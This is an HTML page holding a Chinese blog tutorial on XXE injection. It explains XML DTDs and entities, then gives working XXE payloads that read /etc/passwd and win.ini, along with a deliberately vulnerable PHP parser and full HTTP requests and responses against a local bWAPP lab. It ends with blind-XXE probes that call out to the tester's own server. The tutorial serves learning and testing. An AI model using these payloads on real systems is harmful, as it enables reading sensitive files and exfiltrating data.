@@ -1,0 +1,874 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="123456789101112131415 &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;       &#x2F;&#x2F; XML声明 &lt;!DOCTYPE note [                             &#x2F;&#x2F;定义类型 	&lt;!ELEMENT note (to,from,heading,body)&amp;g">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞学习之XXE注入">
+<meta property="og:url" content="https://sh1yan.top/2018/09/15/xxe-study/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="123456789101112131415 &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;       &#x2F;&#x2F; XML声明 &lt;!DOCTYPE note [                             &#x2F;&#x2F;定义类型 	&lt;!ELEMENT note (to,from,heading,body)&amp;g">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-09-15T09:40:55.000Z">
+<meta property="article:modified_time" content="2019-05-07T13:19:12.000Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="web漏洞">
+<meta property="article:tag" content="XXE">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>漏洞学习之XXE注入 - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="漏洞学习之XXE注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2018-09-15 17:40" pubdate>
+          2018年9月15日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          116 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">漏洞学习之XXE注入</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span>       // XML声明<br> <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [                             //定义类型</span><br><span class="hljs-meta"> 	<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">note</span> (<span class="hljs-keyword">to</span>,<span class="hljs-keyword">from</span>,<span class="hljs-keyword">heading</span>,<span class="hljs-keyword">body</span>)&gt;</span>   //定义元素</span><br><span class="hljs-meta"> 	<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">to</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"> 	<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">from</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>                // 文档类型定义</span><br><span class="hljs-meta"> 	<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">heading</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"> 	<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">body</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>lixin<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>shiyan<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>                // 文档元素<br>  <span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Hurry up and send out XXE&#x27;s article<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。<br>DTD 主要用来解释文档元素的，它有三种应用形式：</p>
+<span id="more"></span>
+
+
+<p>1.内部DTD文档</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 [定义内容]&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>2.外部DTD文档</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;文件名&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>3内外部DTD文档结合</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;DTD文件路劲&quot;</span>[定义内容]&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>DTD文档中有很多重要的关键词：</p>
+<p>DOCTYPE（DTD的声明）<br>ENTITY（实体的声明）<br>SYSTEM、PUBLIC（外部资源申请）</p>
+<p>而实体可以理解为变量，它必须在DTD中定义申明，然后再文档中的其他位置引用该变量，实体也是分三种<br>形式，分别是：</p>
+<p>1.内部实体<br>    <!ENTITY 实体名称 "实体的值"><br>2.外部实体<br>    <!ENTITY 实体名称 SYSTEM "URI"><br>3.参数实体<br>    <!ENTITY % 实体名称 "实体的值"><br>OR<br>    <!ENTITY % 实体名称 SYSTEM "URI"></p>
+<p>XXE主要分为回显和不回显两个类型。<br>一般在测试 XXE 的时候，通过 POST 一个 XML 请求，看是出现了报错还是正常的实体解析，<br>比如 POST 一个 <root>shiyan</root> 如果返回页面只出现了 shiyan 则说明正常的实体解析了。<br>当然也可以 POST 一个这样的完整的 XML代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;pre&gt;<br><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE note [<br>&lt;!ENTITY test  <span class="hljs-string">&quot;shiyan&quot;</span>&gt;<br>]&gt;<br>&lt;note&gt;&amp;test;&lt;/note&gt;<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure>
+
+
+<p>下面是一个测试代码，可以复制到搭建的环境中， 然后本地 POST 尝试下。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;keyword&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 500px; height: 300px&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">keyword = _POST[&#x27;keyword&#x27;];</span><br><span class="hljs-meta">xml_obj = simplexml_load_string(keyword);</span><br><span class="hljs-meta">print_r($xml_obj);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>如果发现支持实体解析，那么就开始尝试是否能引入外部实体了。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">shiyan</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file://localhost/c:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;shiyan;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>OR</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这两个都一样，只不过是上面的那个是查找 windows&#x2F;win 下的，下面的那个是 linux 下的代码。<br>对了，有些情况下，会直接看到 POST 中存在一些 XML 文档元素，我们可以手动的在这些文档元素中，<br>随便输入一些数字或者字母，看看回显的内容中有没有存在可控的参数，如果存在，可以尝试引入外部实体来<br>控制这个可控的参数进行注入。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/bWAPP/xxe-2.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-type</span><span class="hljs-punctuation">: </span>text/xml; charset=UTF-8<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/bWAPP/xxe-1.php<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>59<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>bdshare_firstime=1504239219561; PHPSESSID=qke00v8tqre5b4tdfcjchmb155; security_level=0<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>0.0.0.0<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">reset</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">login</span>&gt;</span>bee<span class="hljs-tag">&lt;/<span class="hljs-name">login</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">secret</span>&gt;</span>Any bugs?<span class="hljs-tag">&lt;/<span class="hljs-name">secret</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">reset</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>在这个数据包中，我们发现 bee 这个参数是可控的，我们可以构造如下数据包，进行尝试是否可以注入读取文件。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/bWAPP/xxe-2.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-type</span><span class="hljs-punctuation">: </span>text/xml; charset=UTF-8<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/bWAPP/xxe-1.php<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>193<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>bdshare_firstime=1504239219561; PHPSESSID=qke00v8tqre5b4tdfcjchmb155; security_level=0<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>0.0.0.0<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE root [<br>&lt;!ENTITY test SYSTEM &quot;file://localhost/c:/windows/win.ini&quot;&gt;<br>]&gt;<br>&lt;reset&gt;<br>  &lt;login&gt;&amp;test;&lt;/login&gt; <br>  &lt;secret&gt;shiyan&lt;/secret&gt;<br>&lt;/reset&gt;<br>&lt;/pre<br></code></pre></td></tr></table></figure>
+
+
+<p>查看响应包。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">&lt;pre&gt;</span><br><span class="hljs-string">HTTP/1.1</span> <span class="hljs-number">200</span> <span class="hljs-string">OK</span><br><span class="hljs-attr">Date:</span> <span class="hljs-string">Thu,</span> <span class="hljs-number">05</span> <span class="hljs-string">Oct</span> <span class="hljs-number">2017 14:29:52 </span><span class="hljs-string">GMT</span><br><span class="hljs-attr">Server:</span> <span class="hljs-string">Apache/2.4.10</span> <span class="hljs-string">(Win32)</span> <span class="hljs-string">OpenSSL/1.0.1h</span> <span class="hljs-string">PHP/5.4.31</span><br><span class="hljs-attr">X-Powered-By:</span> <span class="hljs-string">PHP/5.4.31</span><br><span class="hljs-attr">Expires:</span> <span class="hljs-string">Thu,</span> <span class="hljs-number">19</span> <span class="hljs-string">Nov</span> <span class="hljs-number">1981 08:52:00 </span><span class="hljs-string">GMT</span><br><span class="hljs-attr">Cache-Control:</span> <span class="hljs-literal">no</span><span class="hljs-string">-store,</span> <span class="hljs-literal">no</span><span class="hljs-string">-cache,</span> <span class="hljs-string">must-revalidate,</span> <span class="hljs-string">post-check=0,</span> <span class="hljs-string">pre-check=0</span><br><span class="hljs-attr">Pragma:</span> <span class="hljs-literal">no</span><span class="hljs-string">-cache</span><br><span class="hljs-attr">Content-Length:</span> <span class="hljs-number">96</span><br><span class="hljs-attr">Connection:</span> <span class="hljs-string">close</span><br><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">text/html</span><br><br><span class="hljs-string">;</span> <span class="hljs-string">for</span> <span class="hljs-number">16</span><span class="hljs-string">-bit</span> <span class="hljs-string">app</span> <span class="hljs-string">support</span><br>[<span class="hljs-string">fonts</span>]<br>[<span class="hljs-string">extensions</span>]<br>[<span class="hljs-string">mci</span> <span class="hljs-string">extensions</span>]<br>[<span class="hljs-string">files</span>]<br><span class="hljs-string">&#x27;s secret has been reset!</span><br></code></pre></td></tr></table></figure>
+
+<p>成功回显了我们读取的内容。<br>这个是在有回显的情况下这样操作的，当页面是无回显的，就是报错页面出现xml解析器，或者出现一些空白页面<br>和报错出现绝对路径等等一些情况，我们无法判断是否支持外部引入实体，那么可以这样操作。</p>
+<p>向存在可控参数的地方注入一条向自己服务器发送请求的xml代码</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://localhost/2.txt&quot;</span>&gt;</span>    //localhost 为自己服务器的URL地址</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<p>然后我们查看自己服务器日志，可以看出来是否存在外部引入实体。</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">::<span class="hljs-number">1</span> - - <span class="hljs-string">[06/Oct/2017:11:19:25 +0800]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /2.txt HTTP/1.0&quot;</span> <span class="hljs-number">200</span> <span class="hljs-number">49</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;-&quot;</span><br><span class="hljs-number">127.0.0.1</span> - - <span class="hljs-string">[06/Oct/2017:11:19:25 +0800]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">POST</span> /XXE/test.php HTTP/1.1&quot;</span> <span class="hljs-number">200</span> <span class="hljs-number">325</span> <span class="hljs-string">&quot;http://127.0.0.1/XXE/test.php&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+<p>可以看出来，存在外部引入，当然我们也可以用参数实体来测试。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">shiyan</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://localhost/2.txt&quot;</span>&gt;</span></span><br><span class="hljs-meta">%shiyan;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<p>然后我们继续查看日志，看看参数实体可行不。</p>
